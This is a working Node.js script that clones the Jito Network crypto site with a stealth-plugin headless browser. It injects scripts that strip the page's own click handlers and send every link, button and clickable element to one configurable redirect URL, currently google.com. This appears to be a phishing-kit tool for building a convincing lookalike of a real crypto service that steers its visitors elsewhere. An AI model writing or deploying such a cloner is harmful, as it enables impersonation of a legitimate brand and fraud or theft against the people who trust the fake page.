import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { fileURLToPath, URL } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
puppeteer.use(StealthPlugin());

(async () => {
  const siteUrl = "https://www.jito.network/"; // Removed query parameter for testing
  const outputDir = path.join(__dirname, "cloned");
  const redirectURL = "https://google.com";

  async function clearClonedDirectory() {
    try {
      await fs.remove(outputDir);
      console.log("🧹 Cleared cloned directory:", outputDir);
    } catch (err) {
      console.error("⚠️ Failed to clear cloned directory:", err.message);
    }
  }

  try {
    await clearClonedDirectory();
    await fs.ensureDir(path.join(outputDir, "css"));
    console.log("📁 Created css directories");

    const browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-cache",
        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ],
    });

    try {
      const page = await browser.newPage();
      await page.setDefaultNavigationTimeout(60000);
      await page.setRequestInterception(true);

    

      page.on("request", (request) => {
        request.continue(); // Allow all requests for debugging
      });
      page.on("requestfailed", (request) => {
        console.log(
          `❌ Request failed: ${request.url()} - ${
            request.failure().errorText
          }, Resource Type: ${request.resourceType()}`
        );
      });

      await page.goto(siteUrl, {
        waitUntil: "networkidle0",
        timeout: 600000,
      });
      await page.waitForSelector("body", { timeout: 10000 });

      await new Promise((resolve) => setTimeout(resolve, 5000));

      // Execute JavaScript to modify image src and remove srcset
      await page.evaluate((siteUrl) => {
        const images = document.querySelectorAll("img[src]");
        images.forEach((img) => {
          const src = img.getAttribute("src");
          if (src && !src.startsWith("data:")) {
            try {
              const fullUrl = new URL(src, siteUrl).href;
              const urlObj = new URL(fullUrl);
              const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
              img.setAttribute("src", editedSrc);
              img.removeAttribute("srcset");
              console.log(`🖼️ Updated image: src=${editedSrc}, srcset removed`);
            } catch (err) {
              console.warn(
                `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
              );
              img.removeAttribute("srcset");
            }
          } else {
            img.removeAttribute("srcset");
          }
        });
      }, siteUrl);

      const html = await page.content();
      const $ = cheerio.load(html);

      $("base").remove();
      $("head").prepend(`<base href="${siteUrl}">`);

      // Process images with Cheerio
      const images = $("img[src]");
      for (const el of images.toArray()) {
        const src = $(el).attr("src");
        if (src && !src.startsWith("data:")) {
          try {
            const fullUrl = new URL(src, siteUrl).href;
            const urlObj = new URL(fullUrl);
            let editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
            $(el).attr("src", editedSrc);
            $(el).removeAttr("srcset");
          } catch (err) {
            console.warn(
              `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
            );
            $(el).removeAttr("srcset");
          }
        } else {
          $(el).removeAttr("srcset");
        }
      }

      // Redirect external links
      $("a[href]").each((_, el) => {
        const href = $(el).attr("href");
        if (
          href &&
          href.startsWith("http") &&
          !href.includes(new URL(siteUrl).hostname)
        ) {
          $(el).attr("href", redirectURL);
          $(el).removeAttr("target");
        }
      });

      // Redirect buttons
      $("button:not([data-no-redirect])").each((_, el) => {
        $(el).attr("onclick", `window.location='${redirectURL}'`);
      });

      // Handle cursor:pointer elements
      let pointerCount = 0;
      $("[style]").each((_, el) => {
        const style = $(el).attr("style");
        if (style && style.toLowerCase().includes("cursor: pointer")) {
          $(el).attr("onclick", `window.location='${redirectURL}'`);
          pointerCount++;
        }
      });

      const pointerClasses = new Set();
      $("style").each((_, el) => {
        const css = $(el).html();
        const matches = css.match(
          /\.(\w[\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi
        );
        if (matches) {
          matches.forEach((rule) => {
            const classMatch = rule.match(/\.(\w[\w-]*)/);
            if (classMatch) {
              pointerClasses.add(classMatch[1]);
            }
          });
        }
      });

      $("head").prepend(`<script class="dynamic-script">
        window.addEventListener('DOMContentLoaded', () => {
          console.log("🔁 Running prioritized image fixer...");
          function fixImages() {
            const images = document.querySelectorAll('img');
            images.forEach(img => {
              const src = img.getAttribute('src');
              img.removeAttribute('srcset');
              if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
                img.src = new URL(src, '${siteUrl}').href;
              }
            });
          }
          fixImages();
          setTimeout(fixImages, 3000);
          setInterval(fixImages, 10000);
        });
      </script>`);

      $("head").prepend(`<script class="click-handler-script">
        document.addEventListener("DOMContentLoaded", () => {
          const anchorElements = document.querySelectorAll("a");
          anchorElements.forEach(el => {
            el.setAttribute("href", "${redirectURL}");
            console.log("✅ Added href to <a>: ${redirectURL}");
          });
          const interactiveElements = document.querySelectorAll(
            "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
          );
          interactiveElements.forEach(el => {
            el.onclick = null;
            el.removeAttribute("onclick");
            if (window.jQuery && typeof jQuery === "function") {
              try { jQuery(el).off("click"); } catch (err) {}
            }
            const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
            if (reactKey) delete el[reactKey];
            el.addEventListener("click", (e) => {
              e.preventDefault();
              e.stopImmediatePropagation();
              window.location.href = "${redirectURL}";
            }, true);
          });
        });
      </script>`);

      for (const className of pointerClasses) {
        $(`.${className}`).attr("onclick", `window.location='${redirectURL}'`);
        pointerCount += $(`.${className}`).length;
      }

      console.log("🎯 Pointer-style elements redirected:", pointerCount);
      console.log("🔘 <button> elements redirected:", $("button").length);
      console.log("🔗 <a> links replaced with:", redirectURL);

      await fs.outputFile(path.join(outputDir, "index.html"), $.html());
      console.log("✅ Done! Saved at cloned/index.html");
    } catch (err) {
      console.error("❌ Page processing failed:", err.message, err.stack);
    } finally {
      await browser.close();
    }
  } catch (err) {
    console.error("❌ Script failed:", err.message, err.stack);
  }
})();
